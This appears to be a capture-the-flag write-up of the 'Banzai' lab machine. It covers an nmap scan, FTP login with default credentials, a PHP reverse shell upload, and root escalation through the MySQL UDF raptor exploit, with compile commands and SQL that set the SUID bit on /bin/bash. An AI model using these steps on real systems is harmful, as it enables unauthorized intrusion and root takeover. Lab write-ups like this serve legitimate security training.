---
icon: ubuntu
---

# Banzai - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -Pn -p- 192.168.162.56 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-19 18:25 EDT
Nmap scan report for 192.168.162.56
Host is up (0.030s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open   smtp       Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
8080/tcp open   http       Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Banzai
Aggressive OS guesses: Linux 3.10 - 4.11 (96%), Linux 3.13 - 4.4 (95%), Linux 3.2 - 4.14 (94%), Linux 2.6.32 - 3.13 (93%), Linux 3.16 - 4.6 (92%), Linux 3.8 - 3.16 (91%), Linux 3.16 (90%), Synology DiskStation Manager 7.1 (Linux 4.4) (90%), Linux 2.6.32 - 3.10 (90%), Linux 5.0 - 5.14 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 20/tcp)
HOP RTT      ADDRESS
1   35.35 ms 192.168.45.1
2   35.31 ms 192.168.45.254
3   35.45 ms 192.168.251.1
4   35.51 ms 192.168.162.56
```

### <mark style="color:$primary;">FTP Enumeration</mark>

ftp Service has default credentials `admin:admin`

<figure><img src="../../.gitbook/assets/image (2704).png" alt=""><figcaption></figcaption></figure>

This looks like the root directory of a web application hence the index.php. Nmap revealed http on port 8080 & 8295.I am going to place a reverse php shell and see if I can access it from any of those sites.

I'll use [https://www.revshells.com/](https://www.revshells.com/) to generate it and save it as reverse.php

<figure><img src="../../.gitbook/assets/image (2705).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Write access FTP -> RCE</mark>

After placing the exploit script visit the following site and you shell get a reverse shell you have a listener prepared

<figure><img src="../../.gitbook/assets/image (2706).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2707).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

Discovered MySQL running on localhost .

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

Checking the processes, I found out that MySQL is being run as the root user.

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

I found MySQL creds in the website directory. So far all of the information we found points to a MySQL Raptor Exploit!

### <mark style="color:$primary;">MySQL UDF Raptor Exploit</mark>

```bash
mysql -u root -pEscalateRaftHubris123
```

<figure><img src="../../.gitbook/assets/image (2723).png" alt=""><figcaption></figcaption></figure>

Found the plugin directory and checked for any protections over the files! In this case this is vulnerable to the UDF Raptor Exploit! Let's download the exploit

<figure><img src="../../.gitbook/assets/image (2724).png" alt=""><figcaption></figcaption></figure>

This technique leverages the MySQL instance’s root privileges to load malicious shared objects, enabling an attacker to achieve RCE as root.

Let's compile it and transfer it to the machine

```bash
gcc -g -c 1518.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so 1518.o -lc
chmod 777 raptor_udf2.so
```

<figure><img src="../../.gitbook/assets/image (2725).png" alt=""><figcaption></figcaption></figure>

let's transfer it to the machine using ftp! and change its permissions!

<figure><img src="../../.gitbook/assets/image (2727).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2728).png" alt=""><figcaption></figcaption></figure>

Now run the following commands in mysql!

```sql
use mysql;
create table tryharder(line blob);
insert into tryharder values(load_file('/var/www/html/raptor_udf2.so'));
select * from tryharder into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from func;
select do_system('chmod u+s /bin/bash');
```

<figure><img src="../../.gitbook/assets/image (2729).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2730).png" alt=""><figcaption></figcaption></figure>
